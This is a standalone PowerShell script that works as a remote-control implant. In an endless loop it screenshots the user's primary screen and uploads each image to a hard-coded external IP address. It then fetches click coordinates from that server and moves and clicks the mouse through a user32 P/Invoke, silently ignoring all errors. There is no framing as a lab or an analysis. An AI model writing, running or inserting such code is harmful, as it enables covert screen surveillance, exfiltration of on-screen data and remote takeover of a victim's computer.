# Load required .NET types
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Define Mouse class (no @ strings)
$mouseCode = 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)] public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo); }'
Add-Type -TypeDefinition $mouseCode

# Paths and URLs
$path = "$env:USERPROFILE\Desktop\relay.jpg"
$uploadUrl = "http://134.209.113.62:8080/upload"
$clickUrl = "http://134.209.113.62:8080/click"

# Loop continuously
while ($true) {
    try {
        # Capture screen
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
        $gfx = [Drawing.Graphics]::FromImage($bmp)
        $gfx.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Jpeg)
        $gfx.Dispose()
        $bmp.Dispose()

        # Upload image
        $bytes = [IO.File]::ReadAllBytes($path)
        Invoke-RestMethod -Uri $uploadUrl -Method POST -Body $bytes -ContentType "image/jpeg" | Out-Null

        # Check for click
        $click = Invoke-RestMethod -Uri $clickUrl -Method GET
        $x = $click.x
        $y = $click.y

        if ($x -ge 0 -and $y -ge 0) {
            [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
            Start-Sleep -Milliseconds 100
            [Mouse]::mouse_event(0x02, 0, 0, 0, 0)
            Start-Sleep -Milliseconds 50
            [Mouse]::mouse_event(0x04, 0, 0, 0, 0)

            # Reset click on server
            $reset = @{ x = -1; y = -1 } | ConvertTo-Json
            Invoke-RestMethod -Uri $clickUrl -Method POST -Body $reset -ContentType "application/json" | Out-Null
        }
    } catch {}
    Start-Sleep -Milliseconds 1000
}